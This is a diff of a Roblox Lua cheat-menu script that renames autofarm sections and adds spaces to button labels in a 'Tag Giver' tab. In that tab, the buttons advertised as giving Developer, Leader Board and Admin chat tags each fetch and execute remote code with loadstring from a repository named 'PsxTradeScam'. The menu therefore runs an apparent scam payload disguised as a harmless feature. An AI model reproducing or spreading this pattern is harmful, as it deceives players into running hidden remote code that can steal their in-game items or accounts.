@@ -9,9 +9,7 @@ local MainSection = Main:NewSection("If you encounter any problems DM mesyt on d
 
 --main
 local Main = Window:NewTab("Autofarms")
-local MainSection = Main:NewSection("Milk Up (keyless)")
-local MainSection = Main:NewSection("Project WD (keyless)")
-local MainSection = Main:NewSection("Fruit Farm (OP)")
+local MainSection = Main:NewSection("Best Auto Farms")
 
 
 MainSection:NewButton("Milk Up 🧋(keyless)", "Most popular/best auto farms for everything", function()
@@ -89,7 +87,7 @@ local SepcialTags = Window:NewTab("Tag Giver")
 local SepcialTagsSection = SepcialTags:NewSection("Tag Giver ")
 
 
-SepcialTagsSection:NewButton("Developer Tag🛠️", "Gives Developer Tag in chat", function()
+SepcialTagsSection:NewButton("Developer Tag 🛠️", "Gives Developer Tag in chat", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
 end)
 
@@ -99,12 +97,12 @@ SepcialTagsSection:NewButton("Partner Tag 🔥", "Gives partner tag in chat", fu
 end)
 
 
-SepcialTagsSection:NewButton("Leader Board Tag🌎", "Gives Leader Board tag in chat", function()
+SepcialTagsSection:NewButton("Leader Board Tag 🌎", "Gives Leader Board tag in chat", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
 end)
 
 
-SepcialTagsSection:NewButton("Admin Tag💪", "Gives Admin tag in chat", function()
+SepcialTagsSection:NewButton("Admin Tag 💪", "Gives Admin tag in chat", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
 end)
 
